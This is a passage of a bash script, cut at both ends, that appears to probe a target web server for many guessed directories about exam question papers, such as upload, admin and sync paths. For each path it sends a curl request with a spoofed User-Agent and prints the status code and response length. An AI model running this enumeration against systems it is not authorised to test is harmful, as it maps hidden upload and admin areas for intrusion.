         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PPlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PPlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSyncQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSyncQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceProcessingSuite/"]: "
